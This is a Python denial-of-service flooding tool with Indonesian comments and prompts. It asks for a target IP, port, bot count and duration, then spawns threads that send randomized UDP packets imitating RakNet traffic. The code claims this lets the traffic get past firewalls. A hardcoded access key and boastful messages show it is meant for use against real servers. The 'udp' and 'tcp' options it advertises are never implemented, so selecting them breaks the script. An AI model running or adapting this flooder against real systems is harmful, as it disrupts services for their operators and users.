import socket
import threading
import random
import struct
import time

# Fungsi untuk RakNet Flood
def raknet_flood(ip, port, duration, bot_id):
    end_time = time.time() + duration
    packets_sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print(f"[BOT-{bot_id}] Memulai serangan RakNet ke {ip}:{port} selama {duration} detik...")
    while time.time() < end_time:
        try:
            # Paket handshake RakNet (dimodifikasi untuk menyerupai lalu lintas normal)
            packet_id = random.randint(0x00, 0xFF)  # Random packet ID
            packet_data = struct.pack('>B', packet_id) + b"RakNet" + b"\x00" * random.randint(10, 50)
            sock.sendto(packet_data, (ip, port))
            packets_sent += 1
        except:
            pass
    print(f"[BOT-{bot_id}] Serangan selesai. Total paket terkirim: {packets_sent}")

# Fungsi untuk membuat lalu lintas yang sulit dideteksi (firewall bypass)
def randomized_packet(ip, port, duration, bot_id):
    end_time = time.time() + duration
    packets_sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print(f"[BOT-{bot_id}] Memulai serangan bypass ke {ip}:{port} selama {duration} detik...")
    while time.time() < end_time:
        try:
            packet_data = b"".join(
                random.choice([b"ZAXXYONTOP", b"RakNet", b"\x01\x02\x03"]) for _ in range(random.randint(5, 15))
            )
            sock.sendto(packet_data, (ip, port))
            packets_sent += 1
        except:
            pass
    print(f"[BOT-{bot_id}] Serangan selesai. Total paket terkirim: {packets_sent}")

# Input key otentikasi
key = input("Masukkan key: ")
if key != "zaxxyontop":
    print("Key salah! Keluar...")
    exit()

# Input parameter serangan
ip_target = input("Masukkan IP target: ")
port_target = int(input("Masukkan Port target: "))
attack_type = input("Masukkan jenis serangan (udp/tcp/raknet/bypass): ").lower()
bot_count = int(input("Masukkan jumlah bot: "))
duration = int(input("Masukkan durasi serangan (detik): "))

# Validasi jenis serangan
if attack_type not in ["udp", "tcp", "raknet", "bypass"]:
    print("Jenis serangan tidak valid! Keluar...")
    exit()

# Menjalankan bot
print(f"Attack telah dimulai oleh Zaxxy ganteng! Menyerang {ip_target}:{port_target} dengan {bot_count} bot...")
bot_threads = []

for bot_id in range(1, bot_count + 1):
    if attack_type == "raknet":
        thread = threading.Thread(target=raknet_flood, args=(ip_target, port_target, duration, bot_id))
    elif attack_type == "bypass":
        thread = threading.Thread(target=randomized_packet, args=(ip_target, port_target, duration, bot_id))
    thread.start()
    bot_threads.append(thread)

# Menunggu semua thread selesai
for thread in bot_threads:
    thread.join()

print("Serangan selesai. Zaxxy ganteng telah menunjukkan kekuatannya!")